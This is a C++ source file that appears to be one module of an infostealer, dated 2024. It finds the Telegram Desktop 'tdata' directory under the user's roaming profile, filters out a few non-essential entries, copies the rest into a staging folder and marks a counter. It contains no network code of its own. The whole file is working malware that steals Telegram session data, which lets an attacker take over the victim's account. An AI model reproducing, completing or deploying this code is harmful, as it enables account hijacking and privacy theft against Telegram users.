//
// Created by .1qxz on 07.06.2024.
//

#include "Telegram.h"

static const fs::path TDATA_PATH = Utils::getRoamingPath() / "Telegram Desktop" / "tdata";

void Telegram::execute(fs::path &root) {
    std::vector<fs::path> paths = FilesUtil::scanDirectory(TDATA_PATH, [](const fs::path &path) {
        std::string item_path_str = path.string();

        return !(item_path_str.find("user_data") != std::string::npos ||
                item_path_str.find("emoji") != std::string::npos ||
                item_path_str.find("temp") != std::string::npos);
    });

    if(paths.empty())
        return;

    Counter::setTelegram();

    fs::path dst = root / "Telegram";
    fs::create_directories(dst);

    for(fs::path &path : paths)
    {
        Utils::copy(path, dst);
    }
}
